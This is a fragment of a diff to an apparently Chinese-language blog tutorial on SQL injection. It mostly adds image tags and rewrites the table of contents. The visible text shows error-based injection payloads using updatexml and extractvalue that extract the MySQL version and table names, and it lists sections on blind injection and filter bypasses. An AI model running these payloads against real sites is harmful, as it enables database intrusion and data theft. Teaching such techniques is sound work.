 <h5 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h5><p><code>mysgl&gt; select * from admin where id = 1 and updatexml(1,concat(8x7e,version(),x7e),1);</code></p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527205950287.png" alt="image-20240527205950287"></p>
+<img src="/images/42.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527210049860.png" alt="image-20240527210049860"></p>
+<img src="/images/43.png" class="" title="示例图片 图片描述">
+
 <h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue"></a>extractvalue</h4><p><code>extractvalue(目标xml文档，xml路径)</code><br><code>第二xm1中的位置是可操作的地方，xm1文档中查找字符位置是用/xxx/xxx/xxx/这种格式，如果我们写入其他格式,就会报并且会返回我们写入的非法格式内容，而这个非法的内容就是我们想要查询的内容。</code><br><code>mysgl&gt; select * from person where id = 1 and extractvalue(1,concat(0x7e,(version()),0x7e));</code></p>
 <p><code>ERROR 1105(HY0):XPATH syntax error:&#39;~5.5.53~</code></p>
 <h4 id="其他函数"><a href="#其他函数" class="headerlink" title="其他函数"></a>其他函数</h4><p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527210333801.png" alt="image-20240527210333801"></p>
-<p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527210345231.png" alt="image-20240527210345231"></p>
+<img src="/images/44.png" class="" title="示例图片 图片描述">![image-20240527210345231](C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527210345231.png)
+
+<img src="/images/45.png" class="" title="示例图片 图片描述">
+
 <h4 id="实验-1"><a href="#实验-1" class="headerlink" title="实验"></a>实验</h4><p>1.数据表名获取</p>
 <p><code>and extractvalue(1,concat(0x7e,(select table_name from information_schema.tables where table_schema=database() limit 0,1),0x7e)</code></p>
 <p>2.字段名获取</p>
@@ -582,13 +673,22 @@
 
 <h2 id="mysql数据库中"><a href="#mysql数据库中" class="headerlink" title="mysql数据库中"></a>mysql数据库中</h2><p>创建表</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527211028304.png" alt="image-20240527211028304"></p>
+<img src="/images/46.png" class="" title="示例图片 图片描述">
+
 <p>填入内容</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527211131901.png" alt="image-20240527211131901"></p>
+<img src="/images/47.png" class="" title="示例图片 图片描述">
+
 <p>查询表</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527211154245.png" alt="image-20240527211154245"></p>
+<img src="/images/48.png" class="" title="示例图片 图片描述">
+
 <p>存在漏洞，当输入的字符串长度过长时候，可能出现多用户</p>
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527211251153.png" alt="image-20240527211251153"></p>
+<img src="/images/49.png" class="" title="示例图片 图片描述">
+
 <p><img src="C:\Users\ASUS\AppData\Roaming\Typora\typora-user-images\image-20240527211308687.png" alt="image-20240527211308687"></p>
+<img src="/images/50.png" class="" title="示例图片 图片描述">
 
     </article>
     
@@ -610,7 +710,7 @@
     <div class="article-catelogue--wrapper">
       <div class="catelogue catelogue-1">
         <h3>目录</h3>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">sql注入</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.2.</span> <span class="toc-text">数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#burpsuit"><span class="toc-number">1.2.1.</span> <span class="toc-text">burpsuit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">1.3.</span> <span class="toc-text">字符型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#burpsuit-1"><span class="toc-number">1.3.1.</span> <span class="toc-text">burpsuit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">1.4.</span> <span class="toc-text">sql注入可能出现的位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number">2.</span> <span class="toc-text">漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">2.1.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.1.</span> <span class="toc-text">联合注入原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">2.1.2.</span> <span class="toc-text">联合注入过滤绕过技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#Burpsuite-%E6%95%B0%E5%AD%97%E5%9E%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">2.1.3.</span> <span class="toc-text">Burpsuite 数字型联合注入利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97and%E8%BF%87%E6%BB%A4%E8%A7%A3%E5%86%B3"><span class="toc-number">2.2.2.</span> <span class="toc-text">关键字and过滤解决</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95"><span class="toc-number">2.2.3.</span> <span class="toc-text">注入点测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">2.2.4.</span> <span class="toc-text">过滤逗号的技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6%E6%8A%80%E5%B7%A7"><span class="toc-number">2.2.5.</span> <span class="toc-text">过滤比较运算符技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.2.6.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.3.</span> <span class="toc-text">延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">2.3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-number">2.3.2.</span> <span class="toc-text">实验</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">2.4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">2.4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">2.4.2.</span> <span class="toc-text">updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">2.4.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">2.4.3.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">2.4.4.</span> <span class="toc-text">其他函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C-1"><span class="toc-number">2.4.5.</span> <span class="toc-text">实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number">3.</span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">3.2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">3.3.</span> <span class="toc-text">过滤单引号绕过 十六进制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.3.1.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD"><span class="toc-number">4.</span> <span class="toc-text">mysql数据库中</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8E%9F%E5%9B%A0"><span class="toc-number">1.</span> <span class="toc-text">原因</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">2.</span> <span class="toc-text">数字型注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#burpsuit"><span class="toc-number">2.1.</span> <span class="toc-text">burpsuit</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%AD%97%E7%AC%A6%E5%9E%8B%E6%B3%A8%E5%85%A5"><span class="toc-number">3.</span> <span class="toc-text">字符型注入</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B3%A8%E9%87%8A%E7%AC%A6"><span class="toc-number">4.</span> <span class="toc-text">注释符</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#sql%E6%B3%A8%E5%85%A5%E5%8F%AF%E8%83%BD%E5%87%BA%E7%8E%B0%E7%9A%84%E4%BD%8D%E7%BD%AE"><span class="toc-number">5.</span> <span class="toc-text">sql注入可能出现的位置</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E7%9A%84%E5%88%A9%E7%94%A8"><span class="toc-number"></span> <span class="toc-text">漏洞的利用</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5"><span class="toc-number">1.</span> <span class="toc-text">联合注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E8%BF%87%E6%BB%A4%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7"><span class="toc-number">1.1.</span> <span class="toc-text">联合注入过滤绕过技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%95%B0%E5%AD%97%E5%9E%8B%E8%81%94%E5%90%88%E6%B3%A8%E5%85%A5%E5%88%A9%E7%94%A8"><span class="toc-number">1.2.</span> <span class="toc-text">数字型联合注入利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8"><span class="toc-number">2.</span> <span class="toc-text">布尔盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86"><span class="toc-number">2.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B3%E9%94%AE%E5%AD%97and%E8%BF%87%E6%BB%A4%E8%A7%A3%E5%86%B3"><span class="toc-number">2.2.</span> <span class="toc-text">关键字and过滤解决</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E6%B3%A8%E5%85%A5%E7%82%B9%E6%B5%8B%E8%AF%95"><span class="toc-number">2.3.</span> <span class="toc-text">注入点测试</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#sqlmap"><span class="toc-number">2.4.</span> <span class="toc-text">sqlmap</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E9%80%97%E5%8F%B7%E7%9A%84%E6%8A%80%E5%B7%A7"><span class="toc-number">2.5.</span> <span class="toc-text">过滤逗号的技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E6%AF%94%E8%BE%83%E8%BF%90%E7%AE%97%E7%AC%A6%E6%8A%80%E5%B7%A7"><span class="toc-number">2.6.</span> <span class="toc-text">过滤比较运算符技巧</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">2.7.</span> <span class="toc-text">例题</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BB%B6%E6%97%B6%E7%9B%B2%E6%B3%A8"><span class="toc-number">3.</span> <span class="toc-text">延时盲注</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-1"><span class="toc-number">3.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C"><span class="toc-number">3.2.</span> <span class="toc-text">实验</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#python%E8%87%AA%E5%8A%A8%E5%8C%96%E5%88%A9%E7%94%A8"><span class="toc-number">3.3.</span> <span class="toc-text">python自动化利用</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5"><span class="toc-number">4.</span> <span class="toc-text">报错注入</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%8E%9F%E7%90%86-2"><span class="toc-number">4.1.</span> <span class="toc-text">原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#updatexml"><span class="toc-number">4.2.</span> <span class="toc-text">updatexml</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#%E5%AE%9E%E4%BE%8B"><span class="toc-number">4.2.1.</span> <span class="toc-text">实例</span></a></li></ol></li><li class="toc-item toc-level-4"><a class="toc-link" href="#extractvalue"><span class="toc-number">4.3.</span> <span class="toc-text">extractvalue</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E5%87%BD%E6%95%B0"><span class="toc-number">4.4.</span> <span class="toc-text">其他函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%9E%E9%AA%8C-1"><span class="toc-number">4.5.</span> <span class="toc-text">实验</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%95%E8%BF%87%E6%96%B9%E5%BC%8F"><span class="toc-number"></span> <span class="toc-text">绕过方式</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%A7%E5%B0%8F%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">1.</span> <span class="toc-text">大小写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%8C%E5%86%99%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">双写绕过</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%BF%87%E6%BB%A4%E5%8D%95%E5%BC%95%E5%8F%B7%E7%BB%95%E8%BF%87-%E5%8D%81%E5%85%AD%E8%BF%9B%E5%88%B6"><span class="toc-number">3.</span> <span class="toc-text">过滤单引号绕过 十六进制</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E5%AE%BD%E5%AD%97%E8%8A%82%E6%B3%A8%E5%85%A5"><span class="toc-number">3.1.</span> <span class="toc-text">宽字节注入</span></a></li></ol></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#mysql%E6%95%B0%E6%8D%AE%E5%BA%93%E4%B8%AD"><span class="toc-number"></span> <span class="toc-text">mysql数据库中</span></a>
       </div>
       
         <div class="catelogue catelogue-2">
